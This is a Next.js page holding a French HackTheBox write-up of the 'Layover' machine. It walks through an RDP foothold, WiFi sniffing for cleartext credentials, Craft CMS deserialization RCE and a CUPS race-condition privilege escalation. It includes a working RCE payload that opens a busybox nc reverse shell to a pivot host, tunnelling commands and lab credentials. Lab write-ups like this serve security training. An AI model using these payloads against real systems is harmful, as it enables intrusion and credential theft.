import { Terminal, Key, Shield, Network, Wifi, Server } from "lucide-react";
import { PageHeader } from "@/components/PageHeader";
import { SpoilerWrapper } from "@/components/SpoilerWrapper";

function CodeBlock({
  children,
  title,
  result,
}: {
  children: string;
  title?: string;
  result?: boolean;
}) {
  const label = result ? "Résultat" : title;
  return (
    <div className="my-4">
      {label && (
        <p className={`mb-1 text-xs font-mono ${result ? "text-primary" : "text-muted-foreground"}`}>
          {label}
        </p>
      )}
      <pre className="overflow-x-auto rounded-lg border border-border bg-card p-4 font-mono text-sm text-muted-foreground">
        <code className="whitespace-pre">{children}</code>
      </pre>
    </div>
  );
}

export const metadata = {
  title: "Layover | Writeup HTB | 0xbbuddha",
  description:
    "Writeup de la machine Layover (HackTheBox, Medium, Linux) – assumed breach RDP, jumpbox LXD, pivot WiFi ouvert, sniffing passif, RCE Craft CMS (GHSA-9c4j-cjw3-r3xx) et LPE CUPS (CVE-2026-34990).",
};

export default function WriteupLayoverPage() {
  return (
    <div className="mx-auto max-w-4xl px-4 py-8 sm:px-6 lg:px-10 lg:py-10">
      <PageHeader
        eyebrow="Writeup"
        title="Layover"
        description="Scénario assumed breach : accès RDP sur un jumpbox LXD, jonction d'un WiFi ouvert puis sniffing passif pour récupérer des credentials en clair, RCE authentifiée sur Craft CMS 5.9.8 relayée par un pivot, déchiffrement d'un secret via la security key, puis élévation root par race condition CUPS."
        breadcrumbs={[
          { label: "README", href: "/" },
          { label: "Writeups", href: "/writeups" },
          { label: "Layover" },
        ]}
        stats={[
          { label: "Platform", value: "HackTheBox" },
          { label: "Difficulty", value: "Medium" },
          { label: "OS", value: "Linux" },
          { label: "Date", value: "2026-10-06" },
        ]}
      />

      <SpoilerWrapper
        machineName="Layover"
        unlockCodeHash="e7c1e08c2812a74ddaaf13714790de59c1c69452d17e847104d066716d9fee7c"
      >
      <article className="mt-8 space-y-10">
        <section className="rounded-lg border border-border bg-card p-6">
          <h3 className="font-mono font-semibold text-primary">Contexte (assumed breach)</h3>
          <ul className="mt-2 list-inside list-disc space-y-1 text-sm text-muted-foreground">
            <li>Cible : <code className="rounded bg-muted px-1">10.129.114.204</code></li>
            <li>Point de départ : <strong>contractor / Contractor2026!</strong></li>
            <li>Flags user et root masqués (convention du site + ToS HTB).</li>
          </ul>
        </section>

        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Terminal className="size-5 text-primary" />
            0. Environnement d&apos;attaque
          </h2>
          <p className="text-muted-foreground">
            Tout le travail passe par un conteneur dédié, lancé en <strong>host network / privileged</strong> avec un workspace monté, plus une session <code className="rounded bg-muted px-1">tmux</code> persistante et les variables d&apos;environnement.
          </p>
          <CodeBlock title="Lancement du conteneur">
{`mkdir -p /home/bbuddha/workspace/layover
docker run -dit --name layover --network host --privileged \\
  -v /home/bbuddha/workspace/layover:/workspace -w /workspace \\
  ghcr.io/thenullpigeons/full:latest /bin/bash

# session persistante + variables
docker exec layover bash -c '
cat > /workspace/env.sh <<EOF
export TARGET=10.129.114.204
export USER_HTB="contractor"
export PASS_HTB="Contractor2026!"
EOF
tmux new-session -d -s layover'`}
          </CodeBlock>
          <p className="text-muted-foreground">
            Interface VPN <code className="rounded bg-muted px-1">tun0 = 10.10.x.x</code>, la cible répond.
          </p>
        </section>

        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Terminal className="size-5 text-primary" />
            1. Reconnaissance
          </h2>
          <CodeBlock title="Commandes">
{`nmap -p- --min-rate 2000 10.129.114.204      # 22/ssh, 3389/ms-wbt-server
nmap -sCV -p22,3389 10.129.114.204`}
          </CodeBlock>
          <ul className="mt-2 list-inside list-disc space-y-1 text-sm text-muted-foreground">
            <li><strong>22</strong> : OpenSSH 9.6p1 (Ubuntu) - en fait l&apos;<strong>hôte LXD</strong>.</li>
            <li><strong>3389</strong> : xrdp, <strong>forwardé vers le conteneur airside-ws01</strong>.</li>
          </ul>
          <p className="mt-2 text-muted-foreground">
            Les creds <strong>contractor:Contractor2026!</strong> sont <strong>rejetés en SSH</strong> mais <strong>acceptés en RDP</strong> (xrdp).
          </p>
        </section>

        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Network className="size-5 text-primary" />
            2. Foothold - RDP sur airside-ws01
          </h2>
          <p className="text-muted-foreground">
            Connexion RDP headless (Xvfb + xfreerdp3 + scrot).
          </p>
          <CodeBlock title="Commande">
{`Xvfb :99 -screen 0 1440x900x24 &
DISPLAY=:99 xfreerdp3 /v:10.129.114.204 /u:contractor /p:'Contractor2026!' \\
  /cert:ignore /size:1440x900 &
scrot -o /workspace/rdp.png`}
          </CodeBlock>
          <p className="text-muted-foreground">
            Bureau XFCE → terminal → reverse shell, puis :
          </p>
          <CodeBlock title="Sur airside-ws01">
{`contractor@airside-ws01$ sudo -l      # (ALL : ALL) ALL   -> root trivial
groups                                # contractor sudo netdev wireshark`}
          </CodeBlock>
          <p className="text-muted-foreground">
            <code className="rounded bg-muted px-1">airside-ws01</code> est un <strong>conteneur LXD</strong> (idmappé, non privilégié), jumpbox d&apos;un réseau WiFi simulé. <strong>Aucun flag ici</strong> → machine de pivot.
          </p>
          <p className="text-muted-foreground">
            Canal stable : installation d&apos;une clé SSH root sur le conteneur + tunnel chisel <code className="rounded bg-muted px-1">container:2222 → airside-ws01:22</code>, utilisé ensuite via <code className="rounded bg-muted px-1">ssh -p 2222 root@127.0.0.1</code>.
          </p>
        </section>

        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Wifi className="size-5 text-primary" />
            3. Pivot - WiFi « HTB International WiFi »
          </h2>
          <p className="text-muted-foreground">
            Deux radios virtuelles <code className="rounded bg-muted px-1">mac80211_hwsim</code> (<code className="rounded bg-muted px-1">wlan2</code>, <code className="rounded bg-muted px-1">wlan3</code>). Scan + association sur un SSID <strong>ouvert</strong>.
          </p>
          <CodeBlock title="Commande">
{`wpa_cli -i wlan2 scan ; wpa_cli -i wlan2 scan_results
#  02:00:00:00:00:00  2437  -30  [ESS]  HTB International WiFi   (OUVERT)

ID=$(wpa_cli -i wlan2 add_network)
wpa_cli -i wlan2 set_network $ID ssid 48544220...   # hex "HTB International WiFi"
wpa_cli -i wlan2 key_mgmt NONE ; wpa_cli -i wlan2 enable_network $ID
dhcpcd -4 wlan2                                       # -> 10.13.37.182/24`}
          </CodeBlock>
          <p className="text-muted-foreground">Nouveau sous-réseau <code className="rounded bg-muted px-1">10.13.37.0/24</code> :</p>
          <CodeBlock title="Hôtes découverts">
{`10.13.37.1     53,80,3389   gateway / captive portal  wifi.international.htb
10.13.37.10    22,80        portail Craft CMS         portal.international.htb
10.13.37.132   3389         poste de travail (xrdp) de l'utilisateur simulé`}
          </CodeBlock>
          <p className="text-muted-foreground">
            Proxy SOCKS reverse via <strong>chisel</strong> pour atteindre ce réseau depuis le conteneur :
          </p>
          <CodeBlock title="Commande">
{`# conteneur
chisel server --reverse -p 8089
# airside-ws01
chisel client 10.10.17.79:8089 R:1080:socks
# puis proxychains / curl --socks5-hostname 127.0.0.1:1080`}
          </CodeBlock>
        </section>

        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Key className="size-5 text-primary" />
            4. Sniffing WiFi → creds en clair (groupe wireshark)
          </h2>
          <p className="text-muted-foreground">
            Le groupe <code className="rounded bg-muted px-1">wireshark</code> + WiFi <strong>ouvert</strong> = capture passive. En mode monitor sur <code className="rounded bg-muted px-1">wlan3</code> :
          </p>
          <CodeBlock title="Commande">
{`iw dev wlan3 set type monitor ; iw dev wlan3 set channel 6
tcpdump -i wlan3 -w /tmp/m.pcap
tshark -r /tmp/m.pcap -Y http.request -T fields -e ip.src -e http.host -e http.request.uri
#  10.13.37.132 -> portal.international.htb  POST /miles/login.php   (répété)

tshark -r /tmp/m.pcap -Y 'http.request.method==POST && ip.src==10.13.37.132' \\
  -T fields -e urlencoded-form.key -e urlencoded-form.value
#  username,password   jenny,Fl1ghtDeck2026!`}
          </CodeBlock>
          <CodeBlock title="Résultat" result>
{`Captured creds : jenny : Fl1ghtDeck2026!
(poste .132 qui se logue au portail Miles en HTTP clair)`}
          </CodeBlock>
        </section>

        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Server className="size-5 text-primary" />
            5. User - Craft CMS 5.9.8 → RCE authentifiée
          </h2>
          <p className="text-muted-foreground">
            Les creds Miles sont réutilisés sur l&apos;<strong>admin Craft</strong> (<code className="rounded bg-muted px-1">/admin</code>).
          </p>
          <CodeBlock title="Login CP">
{`loginName=jenny&password=Fl1ghtDeck2026!  →  302 /admin/dashboard`}
          </CodeBlock>
          <p className="text-muted-foreground">
            État : <strong>Craft Solo 5.9.8</strong>, <code className="rounded bg-muted px-1">userIsAdmin=false</code>, <code className="rounded bg-muted px-1">allowAdminChanges=false</code>, <code className="rounded bg-muted px-1">register_argc_argv=Off</code> (CVE-2024-56145 inexploitable), <code className="rounded bg-muted px-1">disable_functions=</code> (vide).
          </p>
          <p className="text-muted-foreground">
            Exploitation via l&apos;advisory <strong>GHSA-9c4j-cjw3-r3xx</strong> (gadget de désérialisation <code className="rounded bg-muted px-1">AttributeTypecastBehavior</code> → <code className="rounded bg-muted px-1">Psy\ConsoleProcessus::execute</code>). La RCE ne peut pas joindre l&apos;attaquant → le reverse shell transite par le pivot :
          </p>
          <CodeBlock title="Chemin du reverse shell">
{`portal(10.13.37.10) → airside-ws01:6969 (wlan2) → chisel forward → conteneur:6969`}
          </CodeBlock>
          <CodeBlock title="Payload (console navigateur / fetch)">
{`fetch("/admin/actions/element-search/search", {
  method: "POST", credentials: "same-origin",
  headers: { "Content-Type":"application/json", "X-CSRF-Token": Craft.csrfTokenValue },
  body: JSON.stringify({
    elementType: "craft\\\\elements\\\\Category", siteId: 1, search: "",
    condition: { class: "craft\\\\elements\\\\conditions\\\\ElementCondition",
      elementType: "craft\\\\elements\\\\Category",
      fieldLayouts: [{ "as rce": {
          __class: "yii\\\\behaviors\\\\AttributeTypecastBehavior",
          "__construct()": [{
            attributeTypes: { typecastBeforeSave: ["Psy\\\\Readline\\\\Hoa\\\\ConsoleProcessus","execute"] },
            typecastBeforeSave: "busybox nc 10.13.37.182 6969 -e /bin/bash" }] },
        "on *": "self::beforeSave" }] } })
});`}
          </CodeBlock>
          <p className="text-muted-foreground">
            Astuce : les reverse shells bash classiques ne connectaient pas ; <strong>busybox nc</strong> vers l&apos;IP wlan2 du jumpbox (<code className="rounded bg-muted px-1">10.13.37.182</code>) fonctionne de façon fiable.
          </p>
          <p className="text-muted-foreground">
            Shell <code className="rounded bg-muted px-1">www-data@portal</code>, lecture du <code className="rounded bg-muted px-1">.env</code> :
          </p>
          <CodeBlock title="Résultat (.env)" result>
{`CRAFT_SECURITY_KEY=IGckihiFK64_lrSgJJ6QLkiPz-ow13Lr
CRAFT_DB_USER=craftuser   CRAFT_DB_PASSWORD=CraftDB_pw_2026   CRAFT_DB_DATABASE=craft`}
          </CodeBlock>
          <p className="text-muted-foreground">
            Le module <code className="rounded bg-muted px-1">modules/htbairways</code> stocke un mot de passe SMTP <strong>chiffré avec la security key</strong> dans <code className="rounded bg-muted px-1">htbairways_settings</code>. Déchiffrement via <code className="rounded bg-muted px-1">php craft shell</code> :
          </p>
          <CodeBlock title="php craft shell">
{`HOME=/tmp php craft shell
> $kv = array_column((new craft\\db\\Query())->select(['name','value'])
        ->from('{{%htbairways_settings}}')->all(), 'value', 'name');
> $k  = Craft::$app->getConfig()->getGeneral()->securityKey;
> echo Craft::$app->getSecurity()->decryptByKey(base64_decode($kv['mailRelayPassword']), $k);
Skyp0rt_Relay!26`}
          </CodeBlock>
          <CodeBlock title="Résultat" result>
{`User creds : aporter : Skyp0rt_Relay!26  (réutilisées en SSH)`}
          </CodeBlock>
          <CodeBlock title="Lecture user.txt">
{`ssh aporter@portal
aporter@portal:~$ cat user.txt`}
          </CodeBlock>
          <CodeBlock title="Résultat (user.txt)" result>
{`REDACTED`}
          </CodeBlock>
        </section>

        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Shield className="size-5 text-primary" />
            6. Root - CUPS LPE (CVE-2026-34990)
          </h2>
          <CodeBlock title="Énumération">
{`aporter@portal:~$ sudo -l           # pas de sudo
aporter@portal:~$ ss -tlnp          # 127.0.0.1:631  (CUPS)
aporter@portal:~$ curl -s localhost:631 | grep CUPS   # CUPS v2.4.16`}
          </CodeBlock>
          <p className="text-muted-foreground">
            <code className="rounded bg-muted px-1">cupsd</code> tourne en <strong>root</strong> et <code className="rounded bg-muted px-1">aporter</code> peut parler à <code className="rounded bg-muted px-1">631</code>. Exploitation de la <strong>race condition</strong> (version allégée du PoC - uniquement la partie LPE, cible <code className="rounded bg-muted px-1">aporter</code>, écriture de <code className="rounded bg-muted px-1">/etc/sudoers.d/aporter-pwn</code>) :
          </p>
          <ol className="mt-2 list-inside list-decimal space-y-1 text-sm text-muted-foreground">
            <li>Capture d&apos;un <em>Local authorization token</em> via <code className="rounded bg-muted px-1">ipptool</code> + <code className="rounded bg-muted px-1">cups-create-local-printer.test</code>.</li>
            <li><code className="rounded bg-muted px-1">CUPS-Create-Local-Printer</code> avec <code className="rounded bg-muted px-1">device-uri=file:///etc/sudoers.d/aporter-pwn</code>.</li>
            <li>Spray <code className="rounded bg-muted px-1">Add-Modify-Printer</code> / <code className="rounded bg-muted px-1">Accept-Jobs</code> / <code className="rounded bg-muted px-1">Resume-Printer</code> + <code className="rounded bg-muted px-1">Print-Job</code> (document gzip = <code className="rounded bg-muted px-1">aporter ALL=(ALL) NOPASSWD: ALL</code>) pour gagner la course.</li>
          </ol>
          <CodeBlock title="Exploitation">
{`aporter@portal:~$ python3 cupsLPE.py
*** RESULT *** Reproduction complete.
aporter@portal:~$ sudo -n id
uid=0(root) gid=0(root) groups=0(root)

aporter@portal:~$ sudo cat /root/root.txt`}
          </CodeBlock>
          <CodeBlock title="Résultat (root.txt)" result>
{`REDACTED`}
          </CodeBlock>
        </section>

        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Network className="size-5 text-primary" />
            7. Résumé de la chaîne
          </h2>
          <CodeBlock>
{`contractor (RDP) ─▶ airside-ws01 (jumpbox, sudo ALL, groupe wireshark)
        │  join open WiFi  (wlan2 = 10.13.37.182)
        ▼
  sniff monitor (wlan3)  ─▶  jenny:Fl1ghtDeck2026!  (POST /miles/login.php en clair)
        │  réutilisation sur Craft CMS CP
        ▼
  Craft 5.9.8  GHSA-9c4j-cjw3-r3xx  ─▶  www-data@portal
        │  .env + php craft shell (déchiffrement)
        ▼
  aporter:Skyp0rt_Relay!26  ─▶  SSH  ─▶  USER
        │  CUPS 2.4.16  CVE-2026-34990 (race → sudoers)
        ▼
  root@portal  ─▶  ROOT`}
          </CodeBlock>
        </section>

        <section className="rounded-lg border border-border bg-card p-6">
          <h3 className="font-mono font-semibold text-primary">Credentials récoltées</h3>
          <CodeBlock>
{`RDP airside-ws01    contractor   Contractor2026!
Craft CP / Miles    jenny        Fl1ghtDeck2026!
SSH portal          aporter      Skyp0rt_Relay!26
MySQL (portal)      craftuser    CraftDB_pw_2026`}
          </CodeBlock>
        </section>
      </article>
      </SpoilerWrapper>
    </div>
  );
}
